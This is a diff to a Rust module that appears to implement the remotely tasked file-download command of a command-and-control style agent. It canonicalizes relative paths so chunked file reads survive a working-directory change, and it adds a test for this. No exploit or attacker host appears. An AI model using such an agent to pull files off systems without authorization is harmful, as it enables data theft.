@@ -26,7 +26,7 @@
 use std::collections::HashMap;
 use std::fs::File;
 use std::io::{Read, Seek, SeekFrom};
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use std::sync::{Mutex, OnceLock};
 
 use base64::Engine;
@@ -71,6 +71,18 @@ struct DownloadMeta {
     path_str: String,
     file_id: Option<Uuid>,
     next_chunk: u32,
+}
+
+fn stable_read_path(path: &Path) -> PathBuf {
+    std::fs::canonicalize(path).unwrap_or_else(|_| {
+        if path.is_absolute() {
+            path.to_path_buf()
+        } else {
+            std::env::current_dir()
+                .unwrap_or_else(|_| PathBuf::from("."))
+                .join(path)
+        }
+    })
 }
 
 static PENDING_DOWNLOADS: OnceLock<Mutex<HashMap<Uuid, DownloadMeta>>> = OnceLock::new();
@@ -274,20 +286,20 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         );
     }
 
-    let path = Path::new(&path_str);
+    let path = stable_read_path(Path::new(&path_str));
     let filename = path
         .file_name()
         .map(|n| n.to_string_lossy().to_string())
         .unwrap_or_else(|| "unknown".into());
-    let full_path = display_path(path);
+    let full_path = display_path(&path);
 
     // 1. Open file and get total size
-    let file = match File::open(path) {
+    let file = match File::open(&path) {
         Ok(f) => f,
         Err(e) => {
             return TaskResponse::failed(
                 task.id,
-                &format!("read {} failed: {e}", display_path(path)),
+                &format!("read {} failed: {e}", display_path(&path)),
             );
         }
     };
@@ -296,7 +308,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         Err(e) => {
             return TaskResponse::failed(
                 task.id,
-                &format!("stat {} failed: {e}", display_path(path)),
+                &format!("stat {} failed: {e}", display_path(&path)),
             );
         }
     };
@@ -334,7 +346,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         full_path: full_path.clone(),
         host: host.clone(),
         total_size,
-        path_str: path_str.clone(),
+        path_str: path.to_string_lossy().to_string(),
         file_id: None,
         next_chunk: 1,
     };
@@ -554,5 +566,65 @@ mod tests {
         assert_eq!(second_download.full_path, None);
 
         let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn test_download_relative_path_survives_cwd_change() {
+        crate::common::cwd::with_cwd_lock(|| {
+            let base = std::env::temp_dir().join(format!(
+                "nanaz_download_cwd_{}_{}",
+                std::process::id(),
+                Uuid::new_v4()
+            ));
+            let first_dir = base.join("first");
+            let second_dir = base.join("second");
+            std::fs::create_dir_all(&first_dir).unwrap();
+            std::fs::create_dir_all(&second_dir).unwrap();
+            let path = first_dir.join("relative.bin");
+            let mut data = vec![0u8; MIN_CHUNK_SIZE as usize + 9];
+            for (i, byte) in data.iter_mut().enumerate() {
+                *byte = (i % 193) as u8;
+            }
+            std::fs::write(&path, &data).unwrap();
+
+            let old_cwd = std::env::current_dir().unwrap();
+            std::env::set_current_dir(&first_dir).unwrap();
+            let task = TaskMessage {
+                id: Uuid::new_v4(),
+                command: "download".into(),
+                parameters: serde_json::json!({
+                    "path": "relative.bin",
+                    "chunk_size": MIN_CHUNK_SIZE,
+                })
+                .to_string(),
+                ..Default::default()
+            };
+            let file_id = Uuid::new_v4();
+
+            let registration = handle(&task);
+            assert_eq!(registration.status.as_deref(), Some("processing"));
+            std::env::set_current_dir(&second_dir).unwrap();
+
+            let first = responses_from_receipts(&[PostResponseReceipt {
+                task_id: task.id,
+                status: "success".into(),
+                file_id: Some(file_id),
+                ..Default::default()
+            }]);
+            assert_eq!(first.len(), 1);
+            assert_eq!(first[0].completed, Some(false));
+
+            let second = responses_from_receipts(&[PostResponseReceipt {
+                task_id: task.id,
+                status: "success".into(),
+                file_id: Some(file_id),
+                ..Default::default()
+            }]);
+            assert_eq!(second.len(), 1);
+            assert_eq!(second[0].completed, Some(true));
+
+            std::env::set_current_dir(old_cwd).unwrap();
+            let _ = std::fs::remove_dir_all(base);
+        });
     }
 }
